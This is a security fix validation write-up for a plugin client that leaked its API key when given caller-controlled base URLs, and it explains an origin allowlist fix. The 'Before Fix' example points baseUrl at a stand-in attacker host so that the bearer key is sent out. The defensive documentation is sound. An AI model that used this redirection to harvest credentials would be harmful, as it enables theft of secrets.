# Security Fix Validation: Trusted Origins Allowlist

## Vulnerability Summary

**Issue**: Noosphere client context leaked the configured API key to caller-controlled base URLs.

**Root Cause**: The `normalizeBaseUrl()` function accepted arbitrary public HTTPS URLs without validating them against a trusted allowlist. This allowed callers who could influence `rawConfig.baseUrl` to redirect authenticated requests to attacker-controlled servers, causing the application to disclose its Noosphere API key.

## Fix Implementation

The fix implements an **allowlist-based validation** mechanism using the semantic anchor of **Server-Side Request Forgery (SSRF) prevention**:

1. **New Configuration Option**: Added `trustedOrigins` array to `NoosphereMemoryConfig`
2. **Origin Parsing**: Added `parseTrustedOrigins()` to normalize and validate origin strings
3. **Allowlist Enforcement**: Modified `normalizeBaseUrl()` to reject non-loopback URLs unless they match an entry in `trustedOrigins`
4. **Secure Default**: Without explicit `trustedOrigins` configuration, only loopback addresses are accepted

## Validation Scenarios

### Scenario 1: Loopback URLs (Always Allowed)
```typescript
// These are always accepted without trustedOrigins configuration
normalizeBaseUrl("http://localhost:3000", undefined)
// ✓ Returns: "http://localhost:3000"

normalizeBaseUrl("http://127.0.0.1:6578", undefined)
// ✓ Returns: "http://127.0.0.1:6578"

normalizeBaseUrl("http://[::1]:3000", undefined)
// ✓ Returns: "http://[::1]:3000"
```

### Scenario 2: Remote URLs Without Allowlist (BLOCKED)
```typescript
// Attack attempt: redirect to attacker-controlled server
normalizeBaseUrl("https://evil.attacker.com", undefined)
// ✗ Returns: "http://localhost:3000" (default, rejected)

normalizeBaseUrl("https://noosphere.example.com", undefined)
// ✗ Returns: "http://localhost:3000" (default, rejected even if legitimate)
```

### Scenario 3: Remote URLs With Allowlist (Validated)
```typescript
const trustedOrigins = ["https://noosphere.example.com"];

normalizeBaseUrl("https://noosphere.example.com", trustedOrigins)
// ✓ Returns: "https://noosphere.example.com"

normalizeBaseUrl("https://noosphere.example.com/api", trustedOrigins)
// ✓ Returns: "https://noosphere.example.com/api"

normalizeBaseUrl("https://evil.attacker.com", trustedOrigins)
// ✗ Returns: "http://localhost:3000" (not in allowlist)

normalizeBaseUrl("https://noosphere.example.com:8443", trustedOrigins)
// ✗ Returns: "http://localhost:3000" (port mismatch)
```

### Scenario 4: Protocol Enforcement
```typescript
const trustedOrigins = ["https://noosphere.example.com"];

// Non-loopback HTTP is always rejected
normalizeBaseUrl("http://noosphere.example.com", trustedOrigins)
// ✗ Returns: "http://localhost:3000" (HTTP not allowed for remote)
```

## Configuration Examples

### Secure Local Development
```json5
{
  "config": {
    "baseUrl": "http://localhost:6578",
    // No trustedOrigins needed for loopback
    "apiKey": { "source": "file", "provider": "noosphere-memory", "id": "/apiKey" }
  }
}
```

### Secure Remote Production
```json5
{
  "config": {
    "baseUrl": "https://noosphere.example.com",
    "trustedOrigins": ["https://noosphere.example.com"],
    "apiKey": { "source": "file", "provider": "noosphere-memory", "id": "/apiKey" }
  }
}
```

### Multiple Trusted Instances
```json5
{
  "config": {
    "baseUrl": "https://noosphere-primary.example.com",
    "trustedOrigins": [
      "https://noosphere-primary.example.com",
      "https://noosphere-backup.example.com"
    ],
    "apiKey": { "source": "file", "provider": "noosphere-memory", "id": "/apiKey" }
  }
}
```

## Attack Prevention

### Before Fix
```typescript
// Attacker controls rawConfig
const maliciousConfig = {
  baseUrl: "https://attacker.evil.com/capture"
};

// API key would be sent to attacker's server
createNoosphereClientContextForAgent(maliciousConfig, "agent-id");
// ✗ Sends: Authorization: Bearer noo_secret123... to attacker.evil.com
```

### After Fix
```typescript
// Attacker controls rawConfig
const maliciousConfig = {
  baseUrl: "https://attacker.evil.com/capture"
};

// Without trustedOrigins, falls back to localhost
createNoosphereClientContextForAgent(maliciousConfig, "agent-id");
// ✓ Sends requests to localhost:3000 instead
// ✓ API key never reaches attacker's server

// With trustedOrigins, only allowlisted origins accepted
const safeConfig = {
  baseUrl: "https://attacker.evil.com/capture",
  trustedOrigins: ["https://noosphere.example.com"]
};
createNoosphereClientContextForAgent(safeConfig, "agent-id");
// ✓ Falls back to localhost:3000 (not in allowlist)
// ✓ API key never reaches attacker's server
```

## Migration Guide

### Existing Localhost Deployments
No changes required. Loopback URLs continue to work without configuration.

### Existing Remote Deployments
Add `trustedOrigins` to your configuration:

```json5
{
  "config": {
    "baseUrl": "https://your-noosphere-instance.com",
    // Add this line:
    "trustedOrigins": ["https://your-noosphere-instance.com"],
    "apiKey": { "source": "file", "provider": "noosphere-memory", "id": "/apiKey" }
  }
}
```

### Environment Variable Users
If you use `OPENCLAW_NOOSPHERE_BASE_URL` or `NOOSPHERE_BASE_URL` environment variables
pointing to remote instances, you must add `trustedOrigins` to your plugin configuration
file. Environment variables alone cannot bypass the allowlist.

## Security Properties

1. **Defense in Depth**: Even if caller input reaches `rawConfig.baseUrl`, it cannot redirect credentials to untrusted destinations
2. **Fail Secure**: Missing or invalid `trustedOrigins` defaults to localhost-only, preventing accidental exposure
3. **Explicit Trust**: Administrators must explicitly declare which remote origins can receive credentials
4. **Origin Matching**: Uses URL origin (scheme + host + port) for precise matching, preventing subdomain attacks
5. **HTTPS Enforcement**: Remote URLs must use HTTPS, preventing plaintext credential transmission
